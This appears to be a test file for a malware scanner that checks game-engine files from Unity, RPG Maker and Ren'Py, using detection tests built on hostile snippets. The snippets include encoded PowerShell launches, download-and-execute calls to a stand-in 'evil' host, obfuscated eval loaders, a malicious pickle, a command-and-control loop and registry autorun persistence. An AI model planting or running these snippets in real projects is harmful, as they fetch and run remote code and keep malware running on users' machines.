from Virus_Scan.heuristics import evaluate_game_engine_threats
from Virus_Scan.detection.chains.execution.anchors import evaluate_chain_evidence
from Virus_Scan.tests.support.canonical_chain_fixtures import physical_tag_evidence


def _evidence_for(text: str, path: str) -> tuple[set[str], set[str]]:
    result = evaluate_game_engine_threats(text, path=path)
    evidence = physical_tag_evidence(tuple(result.get("tags") or ()), source_detector="stage26", source_stage="test")
    chains = evaluate_chain_evidence(tags=evidence)
    chain_ids = {
        decision.candidate.chain_id
        for decision in chains.decisions
        if decision.status in {"confirmed", "candidate"}
    }
    return set(evidence.tags), chain_ids


def test_unity_stage25_atomic_evidence_and_canonical_chains():
    cases = (
        (
            'System.Diagnostics.Process.Start("powershell.exe","-enc SQBFAFgA");',
            "Assembly-CSharp.cs",
            {"unity_external_process_exec", "process_exec", "powershell_exec"},
            set(),
        ),
        (
            'new WebClient().DownloadString("http://evil/p.ps1"); '
            'System.Diagnostics.Process.Start("cmd.exe","/c x");',
            "Assets/unity.cs",
            {"remote_payload_download", "payload_execution", "process_exec"},
            {"anchor:download_execute_chain"},
        ),
        (
            "Assembly.Load(b).EntryPoint.Invoke(null,null);",
            "Assets/unity.cs",
            {"unity_reflection_execution", "payload_execution"},
            set(),
        ),
        (
            "TcpClient c; NetworkStream s; while(true){ recv(command); send(cmd); }",
            "Assets/unity.cs",
            {"network_c2", "remote_command_channel"},
            set(),
        ),
    )
    for text, path, expected_tags, expected_chains in cases:
        tags, chains = _evidence_for(text, path)
        assert expected_tags <= tags
        assert expected_chains <= chains


def test_rpgm_stage25_atomic_evidence_and_canonical_chains():
    cases = (
        'fetch("http://evil/payload").then(r=>r.text()).then(t=>Function(t)());',
        'PluginManager.loadScript("http://evil/stage.js"); '
        "SceneManager.onError=function(){eval(arguments[0])};",
    )
    for text in cases:
        tags, chains = _evidence_for(text, "www/js/plugins/x.js")
        assert {"rpgm_dynamic_eval_loader", "network_download", "payload_execution"} <= tags
        assert "anchor:rpgm_network_process_execution" in chains

    tags, _chains = _evidence_for(
        'var _0x=["ZXZhbA=="]; window[atob(_0x[0])]('
        'atob("cmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2NtZCcp"));',
        "www/js/plugins/x.js",
    )
    assert {"rpgm_dynamic_eval_loader", "script_execution"} <= tags


def test_renpy_stage25_atomic_evidence_and_canonical_chains():
    tags, _chains = _evidence_for(
        'init python:\n import os\n os.system("powershell -enc SQBFAFgA")',
        "game/script.rpy",
    )
    assert {"renpy_external_process_exec", "process_exec", "powershell_exec"} <= tags

    tags, chains = _evidence_for(
        "\x80\x04cos\nsystem\npowershell -enc SQBFAFgA",
        "game/00audio.rpyc",
    )
    assert {"pickle_reduce_opcode", "pickle_callable_reference", "pickle_dangerous_global"} <= tags
    assert "pickle_reduce_callable_exec_chain" in chains

    tags, _chains = _evidence_for(
        'init python:\n import winreg\n winreg.SetValueEx(None,"x",0,0,"a.exe") '
        "# CurrentVersion\\Run",
        "game/x.rpy",
    )
    assert {"persistence", "autorun_persistence", "startup_persistence"} <= tags
